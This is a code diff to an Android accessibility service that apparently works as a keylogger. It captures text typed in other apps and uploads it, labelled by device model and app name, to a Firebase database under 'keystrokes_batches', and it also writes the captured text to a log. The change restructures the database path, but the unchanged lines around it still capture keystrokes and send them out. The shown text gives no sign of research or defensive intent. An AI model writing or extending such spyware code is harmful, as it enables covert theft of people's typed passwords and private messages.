@@ -6,6 +6,7 @@ import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.annotation.RequiresApi
+import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -19,8 +20,8 @@ class AppAccessibilityService : AccessibilityService() {
     companion object {
         private const val TAG = "AppAccessibilityService"
         private val scope = CoroutineScope(Dispatchers.IO)
-        private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
+            FirebaseDatabase.getInstance().getReference().child(deviceName).child("keystrokes_batches")
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -58,8 +59,8 @@ class AppAccessibilityService : AccessibilityService() {
 
             scope.launch {
                 try {
-                    val ref = getDatabaseRef() ?: return@launch
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
+                    val ref = getDatabaseRef(deviceName) ?: return@launch
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                     val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")
 
@@ -70,7 +71,7 @@ class AppAccessibilityService : AccessibilityService() {
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child(deviceName).child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
+                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Accessibility text synced to Firebase successfully")
                             LogStore.addLog("[$deviceName] Accessibility synced ($sanitizedAppName): $typedText")
